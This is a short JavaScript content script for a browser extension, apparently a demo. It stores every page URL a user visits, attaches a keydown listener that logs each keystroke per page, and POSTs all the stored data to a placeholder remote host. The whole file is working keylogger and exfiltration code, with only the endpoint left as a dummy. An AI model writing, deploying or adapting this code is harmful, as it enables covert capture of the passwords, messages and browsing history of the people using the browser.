(async function(){
    let stored = await browser.storage.local.get();

    let data ={url: []};
    try{
        data.url = stored.data.url;
    } catch(err) {console.error(err)}

    data.url.push(document.baseURI);
    browser.storage.local.set({data});
})();

async function logKeys(keyPressed){
    let stored = await browser.storage.local.get();
    let keys = {};
    keys[document.baseURI] = "";
    if(stored.keys != undefined){
        keys = stored.keys
    }
    if(stored.keys[document.baseURI] == undefined){
        keys[document.baseURI] = "";
    }
    keys[document.baseURI] += keyPressed;
    browser.storage.local.set({keys});
}

(async function(){
    let stored = await browser.storage.local.get();
    console.log(stored);
})();

(function(){
    document.addEventListener("keydown", function(keyPressed){
        logKeys(keyPressed.key);
    })
})();

(async function(){ 
    try{
        let request = await fetch('https://this.is.an.invalidurl', {
            method: 'POST',
            body: JSON.stringify({
              stored: await browser.storage.local.get(),
            }),
            headers: {
              'Content-type': 'application/json; charset=UTF-8',
            },
        });
        let response = await request.json();
        console.log(response);
    }
    catch(err){
        console.error(err);
    }
})()
